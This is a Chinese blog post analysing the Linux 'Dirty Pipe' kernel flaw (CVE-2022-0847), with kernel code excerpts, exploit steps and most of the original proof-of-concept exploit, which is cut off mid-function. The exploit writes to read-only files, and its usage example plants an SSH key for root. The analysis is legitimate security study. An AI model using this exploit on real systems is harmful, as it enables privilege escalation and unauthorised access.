<h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><p>漏洞提交者维护了关于网站的日志管理服务，这个日志服务的功能之一就是打包每天对应网站每天的访问日志，在月末的时候，提供一个日志下载功能，当用户请求这个功能时，该功能通过HTTP，先发送一个ZIP头，再发送每天的日志压缩包，最后发送一个中央目录（就是另一个头的意思）。这个功能机遇splice()，可以将数据直接从硬盘发送到HTTP连接，省去了将所有日志文件再压缩到一起的这么一个操作，提高了响应效率。</p>
<p>但是，这个功能出现了bug。有用户反馈下载的日志文件损坏，无法解压，这个bug被反馈了很多次。结果就是，漏洞提交者开始找bug，千辛万苦，发现了个新漏洞，可怜的程序员。</p>
<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><h2 id="一些概念"><a href="#一些概念" class="headerlink" title="一些概念"></a>一些概念</h2><ul>
<li><strong>页面</strong>，基于虚拟内存的操作系统中用于内存管理的最小数据单元，最小大小为4kb。</li>
<li><strong>页面缓存</strong>，最近访问过的内存页面，存储在内存中，以加快访问速度，当内核认为该页面不再需要时，就会回收这些页面。通过页面缓存，系统可以直接将页面映射到用户空间，这样就去除了复制的成本。</li>
<li><strong>管道</strong>，对于进程间通信而言，通常使用共享内存页面，其中一个进程读取，另一个进程写入，通常管道跨越多个内存页。</li>
<li><strong>匿名管道</strong>，当进程间共享的信息不占用整个内存页时，可以被另一个管道重用，导致来自不同管道的数据共存于同一个内存页中。</li>
<li><strong>管道标志</strong>，管道标志指定状态和权限等特征。</li>
</ul>
<p><code>splice()</code>在将数据从文件拷贝到管道中时，首先将数据加载到页面缓存中，然后在页面缓存中创建一个<code>struct pipe_buffer</code>指针，但是不同于匿名管道，随后写入的数据不能附加到该页面上，因为该页面的持有者为页面缓存。</p>
<h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><p>管道是内核提供的一种通信机制，由pipe&#x2F;pipe2函数创建，返回两个文件描述符，一个读取，一个写入。</p>
<p><strong>管道在内核中的实现方式</strong></p>
<p>通常管道的缓存空间总长度为65536 个字节，用页的形式进行管理，一共16页，每页4096字节，形成一个环形链表，结构如下：</p>
<img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/image-20220309124007780.png" alt="image-20220309124007780" style="zoom:67%;" />

<p>注意这里的16个页面并不连续，而是通过数组进行表示，<code>pipe-&gt;head</code>负责写入，<code>pipe-&gt;tail</code>负责读取。看一下<code>pipe_write</code>函数，关键之处在于第二步：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line"><span class="title function_">pipe_write</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">struct</span> iov_iter *from)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span> =</span> iocb-&gt;ki_filp;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> filp-&gt;private_data;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> head;</span><br><span class="line">	<span class="type">ssize_t</span> ret = <span class="number">0</span>;</span><br><span class="line">	<span class="type">size_t</span> total_len = iov_iter_count(from);</span><br><span class="line">	<span class="type">ssize_t</span> chars;</span><br><span class="line">	<span class="type">bool</span> was_empty = <span class="literal">false</span>;</span><br><span class="line">	<span class="type">bool</span> wake_next_writer = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">	··· ···</span><br><span class="line">    ··· ···</span><br><span class="line">	head = pipe-&gt;head;</span><br><span class="line">	was_empty = pipe_empty(head, pipe-&gt;tail);</span><br><span class="line">	chars = total_len &amp; (PAGE_SIZE<span class="number">-1</span>);</span><br><span class="line">	<span class="keyword">if</span> (chars &amp;&amp; !was_empty) &#123; </span><br><span class="line">        <span class="comment">//[1]pipe 缓存不为空，则尝试是否能从当前最后一页&quot;接着&quot;写</span></span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="number">1</span>) &amp; mask];</span><br><span class="line">		<span class="type">int</span> offset = buf-&gt;offset + buf-&gt;len; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;</span><br><span class="line">		    offset + chars &lt;= PAGE_SIZE) &#123; </span><br><span class="line">            <span class="comment">/*[2]如果PIPE_BUF_FLAG_CAN_MERGE 标志位存在，代表该页允许接着写</span></span><br><span class="line"><span class="comment">             *如果写入长度不会跨页，则接着写，否则直接另起一页 */</span></span><br><span class="line">			ret = pipe_buf_confirm(pipe, buf);</span><br><span class="line">			···</span><br><span class="line">			ret = copy_page_from_iter(buf-&gt;page, offset, chars, from);</span><br><span class="line">			···</span><br><span class="line">			&#125;</span><br><span class="line">			buf-&gt;len += ret;</span><br><span class="line">			···</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;<span class="comment">//[3]如果上一页没法接着写，则重新起一页</span></span><br><span class="line">		··· ···</span><br><span class="line">		head = pipe-&gt;head;</span><br><span class="line">		<span class="keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;</span><br><span class="line">			<span class="type">unsigned</span> <span class="type">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> pipe-&gt;tmp_page;</span><br><span class="line">			<span class="type">int</span> copied;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!page) &#123;<span class="comment">//[4]重新申请一个新页</span></span><br><span class="line">				page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);</span><br><span class="line">				<span class="keyword">if</span> (unlikely(!page)) &#123;</span><br><span class="line">					ret = ret ? : -ENOMEM;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				pipe-&gt;tmp_page = page;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"></span><br><span class="line">			head = pipe-&gt;head;</span><br><span class="line">			··· ···</span><br><span class="line">			pipe-&gt;head = head + <span class="number">1</span>;</span><br><span class="line">			spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* Insert it into the buffer array */</span></span><br><span class="line">			buf = &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line">			buf-&gt;page = page;<span class="comment">//[5]将新申请的页放到页数组中</span></span><br><span class="line">			buf-&gt;ops = &amp;anon_pipe_buf_ops;</span><br><span class="line">			buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">			buf-&gt;len = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">if</span> (is_packetized(filp))</span><br><span class="line">				buf-&gt;flags = PIPE_BUF_FLAG_PACKET;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;</span><br><span class="line">            	<span class="comment">//[6]设置flag，默认PIPE_BUF_FLAG_CAN_MERGE</span></span><br><span class="line">			pipe-&gt;tmp_page = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">			copied = copy_page_from_iter(page, <span class="number">0</span>, PAGE_SIZE, from); </span><br><span class="line">            <span class="comment">//[7]拷贝操作</span></span><br><span class="line">			··· ···</span><br><span class="line">			ret += copied;</span><br><span class="line">			buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">			buf-&gt;len = copied;</span><br><span class="line"></span><br><span class="line">			··· ···</span><br><span class="line">		&#125;</span><br><span class="line">        ··· ···</span><br><span class="line">    &#125;</span><br><span class="line">	··· ···</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="splice系统调用"><a href="#splice系统调用" class="headerlink" title="splice系统调用"></a>splice系统调用</h3><p><strong>定义</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* splice() moves data between two file descriptors without copying </span></span><br><span class="line"><span class="comment"> * between kernel address space and user address space.  </span></span><br><span class="line"><span class="comment"> * It transfers up to len bytes of data from the file descriptor fd_in </span></span><br><span class="line"><span class="comment"> * to the file descriptor fd_out, where one of the file descriptors must refer to a pipe. </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">splice</span><span class="params">(<span class="type">int</span> fd_in, <span class="type">off64_t</span> *off_in, <span class="type">int</span> fd_out,</span></span><br><span class="line"><span class="params">                      <span class="type">off64_t</span> *off_out, <span class="type">size_t</span> len, <span class="type">unsigned</span> <span class="type">int</span> flags)</span>;</span><br></pre></td></tr></table></figure>

<p><strong>作用</strong></p>
<p>拼接数据。</p>
<p><strong>调用栈如下</strong>：</p>
<ul>
<li><code>SYSCALL_DEFINE6(splice,...)</code> -&gt; <code>__do_sys_splice</code> -&gt; <code>__do_splice</code>-&gt; <code>do_splice</code><ul>
<li><code>splice_file_to_pipe</code> -&gt; <code>do_splice_to</code><ul>
<li><code>generic_file_splice_read</code>(<code>in-&gt;f_op-&gt;splice_read</code> 默认为 <code>generic_file_splice_read</code>)<ul>
<li><code>call_read_iter</code> -&gt; <code>filemap_read</code><ul>
<li><code>copy_page_to_iter</code> -&gt; <code>copy_page_to_iter_pipe</code></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><code>copy_page_to_iter_pipe</code>将<code>pipe</code> 缓存页结构指向要传输的文件的文件缓存页：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span> <span class="title function_">copy_page_to_iter_pipe</span><span class="params">(<span class="keyword">struct</span> page *page, <span class="type">size_t</span> offset, <span class="type">size_t</span> bytes,</span></span><br><span class="line"><span class="params">			 <span class="keyword">struct</span> iov_iter *i)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> i-&gt;pipe;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> p_tail = pipe-&gt;tail;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> p_mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> i_head = i-&gt;head;</span><br><span class="line">	<span class="type">size_t</span> off;</span><br><span class="line"></span><br><span class="line">	··· ···</span><br><span class="line"></span><br><span class="line">	off = i-&gt;iov_offset;</span><br><span class="line">	buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];<span class="comment">//[1]获取对应的pipe缓存页</span></span><br><span class="line">	··· ···</span><br><span class="line">	</span><br><span class="line">	buf-&gt;ops = &amp;page_cache_pipe_buf_ops;<span class="comment">//[2]修改pipe缓存页的相关信息指向文件缓存页</span></span><br><span class="line">	get_page(page);</span><br><span class="line">	buf-&gt;page = page;    <span class="comment">//[2]页指针指向了文件缓存页</span></span><br><span class="line">	buf-&gt;offset = offset;<span class="comment">//[2]offset len 等设置为当前信息(通过splice传入参数决定)</span></span><br><span class="line">	buf-&gt;len = bytes;</span><br><span class="line"></span><br><span class="line">	pipe-&gt;head = i_head + <span class="number">1</span>;</span><br><span class="line">	i-&gt;iov_offset = offset + bytes;</span><br><span class="line">	i-&gt;head = i_head;</span><br><span class="line">out:</span><br><span class="line">	i-&gt;count -= bytes;</span><br><span class="line">	<span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>总结：splice的零拷贝（是指不需要拷贝动作，来实现数据的传输），是将pipe的缓存页，变为页面缓存，方法是改变指针：</p>
<img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/image-20220309124515813.png" alt="image-20220309124515813" style="zoom:67%;" />

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="linux-内核page-cache机制"><a href="#linux-内核page-cache机制" class="headerlink" title="linux 内核page cache机制"></a>linux 内核page cache机制</h3><p>linux将打开的文件放到<strong>缓存页</strong>之中，缓存页被使用过后也会保存一段时间避免不必要的IO操作。短时间内访问同一个文件，都会操作相同的文件缓存页，而不是反复打开。</p>
<h2 id="漏洞起因"><a href="#漏洞起因" class="headerlink" title="漏洞起因"></a>漏洞起因</h2><p><code>PIPE_BUF_FLAG_CAN_MERGE</code>标志是在内核5.8中引入的，第一次<a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958">commit</a> (f6dd975583bd8ce088400648fd9819e4691c8958)是在2020年5月，表示可以合并页面的管道中的数据，而无需重写内存中的数据。</p>
<p>但起因还要更早一些，在2016年的<a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/241699cd72a8489c9446ae3910ddd243e9b9061b">commit</a> (241699cd72a8489c9446ae3910ddd243e9b9061b)中，引入了两个新的函数用于分配新的<code>struct pipe_buffer</code>，然而却忘了初始化其flags成员。结合<code>PIPE_BUF_FLAG_CAN_MERGE</code>标志，就可以覆写页面缓存中的数据。</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>利用限制：</p>
<ul>
<li>攻击者必须具有读取权限，因为需要将splice()页面放入管道。</li>
<li>偏移量不能在页面边界上，因为该页面的至少一个字节必须已拼接到管道中。</li>
<li>写入不能跨越页面边界，因为将为其余部分创建一个新的匿名管道。</li>
<li>文件无法调整大小，因为管道有自己的页面填充管理，并且不会告诉页面缓存附加了多少数据。</li>
</ul>
<p>利用步骤：</p>
<ol>
<li>以读取模式打开一个文件。</li>
<li>使用pipe()系统调用创建一个管道，此函数为允许写入和读取的描述符提供相同的进程访问权限。</li>
<li>将任意数据写入管道进行填充，将使用<code>PIPE_BUF_FLAG_CAN_MERGE</code>标志初始化内存页面。</li>
<li>所有页面都标记了以后，就可以通过从管道中读取数据来释放它们。</li>
<li>当内核使用2016年引入的函数保存页面时，就不会初始化页面标志，则仍然为<code>PIPE_BUF_FLAG_CAN_MERGE</code>标志。</li>
<li>使用<code>splice()</code>函数加载开始时打开的文件，分配给这个文件的内存页将与我们的空管道相同。</li>
<li>直接覆盖管道中的数据。</li>
</ol>
<p>漏洞提交者给出的exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* SPDX-License-Identifier: GPL-2.0 */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright 2022 CM4all GmbH / IONOS SE</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * author: Max Kellermann &lt;max.kellermann@ionos.com&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Proof-of-concept exploit for the Dirty Pipe</span></span><br><span class="line"><span class="comment"> * vulnerability (CVE-2022-0847) caused by an uninitialized</span></span><br><span class="line"><span class="comment"> * &quot;pipe_buffer.flags&quot; variable.  It demonstrates how to overwrite any</span></span><br><span class="line"><span class="comment"> * file contents in the page cache, even if the file is not permitted</span></span><br><span class="line"><span class="comment"> * to be written, immutable or on a read-only mount.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This exploit requires Linux 5.8 or later; the code path was made</span></span><br><span class="line"><span class="comment"> * reachable by commit f6dd975583bd (&quot;pipe: merge</span></span><br><span class="line"><span class="comment"> * anon_pipe_buf*_ops&quot;).  The commit did not introduce the bug, it was</span></span><br><span class="line"><span class="comment"> * there before, it just provided an easy way to exploit it.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * There are two major limitations of this exploit: the offset cannot</span></span><br><span class="line"><span class="comment"> * be on a page boundary (it needs to write one byte before the offset</span></span><br><span class="line"><span class="comment"> * to add a reference to this page to the pipe), and the write cannot</span></span><br><span class="line"><span class="comment"> * cross a page boundary.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Example: ./write_anything /root/.ssh/authorized_keys 1 $&#x27;\nssh-ed25519 AAA......\n&#x27;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Further explanation: https://dirtypipe.cm4all.com/</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PAGE_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 4096</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Create a pipe where all &quot;bufs&quot; on the pipe_inode_info ring have the</span></span><br><span class="line"><span class="comment"> * PIPE_BUF_FLAG_CAN_MERGE flag set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">prepare_pipe</span><span class="params">(<span class="type">int</span> p[<span class="number">2</span>])</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (pipe(p)) <span class="built_in">abort</span>();</span><br><span class="line"></span><br><span class="line">	<span class="type">const</span> <span class="type">unsigned</span> pipe_size = fcntl(p[<span class="number">1</span>], F_GETPIPE_SZ);</span><br><span class="line">	<span class="type">static</span> <span class="type">char</span> buffer[<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* fill the pipe completely; each pipe_buffer will now have</span></span><br><span class="line"><span class="comment">	   the PIPE_BUF_FLAG_CAN_MERGE flag */</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">unsigned</span> r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line">		<span class="type">unsigned</span> n = r &gt; <span class="keyword">sizeof</span>(buffer) ? <span class="keyword">sizeof</span>(buffer) : r;</span><br><span class="line">		write(p[<span class="number">1</span>], buffer, n);</span><br><span class="line">		r -= n;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* drain the pipe, freeing all pipe_buffer instances (but</span></span><br><span class="line"><span class="comment">	   leaving the flags initialized) */</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">unsigned</span> r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line">		<span class="type">unsigned</span> n = r &gt; <span class="keyword">sizeof</span>(buffer) ? <span class="keyword">sizeof</span>(buffer) : r;</span><br><span class="line">		read(p[<span class="number">0</span>], buffer, n);</span><br><span class="line">		r -= n;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* the pipe is now empty, and if somebody adds a new</span></span><br><span class="line"><span class="comment">	   pipe_buffer without initializing its &quot;flags&quot;, the buffer</span></span><br><span class="line"><span class="comment">	   will be mergeable */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (argc != <span class="number">4</span>) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Usage: %s TARGETFILE OFFSET DATA\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* dumb command-line argument parser */</span></span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *<span class="type">const</span> path = argv[<span class="number">1</span>];</span><br><span class="line">	<span class="type">loff_t</span> offset = strtoul(argv[<span class="number">2</span>], <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *<span class="type">const</span> data = argv[<span class="number">3</span>];</span><br><span class="line">	<span class="type">const</span> <span class="type">size_t</span> data_size = <span class="built_in">strlen</span>(data);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (offset % PAGE_SIZE == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Sorry, cannot start writing at a page boundary\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">const</span> <span class="type">loff_t</span> next_page = (offset | (PAGE_SIZE - <span class="number">1</span>)) + <span class="number">1</span>;</span><br><span class="line">	<span class="type">const</span> <span class="type">loff_t</span> end_offset = offset + (<span class="type">loff_t</span>)data_size;</span><br><span class="line">	<span class="keyword">if</span> (end_offset &gt; next_page) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Sorry, cannot write across a page boundary\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* open the input file and validate the specified offset */</span></span><br><span class="line">	<span class="type">const</span> <span class="type">int</span> fd = open(path, O_RDONLY); <span class="comment">// yes, read-only! :-)</span></span><br><span class="line">	<span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;open failed&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">	<span class="keyword">if</span> (fstat(fd, &amp;st)) &#123;</span><br><span class="line">		perror(<span class="string">&quot;stat failed&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (offset &gt; 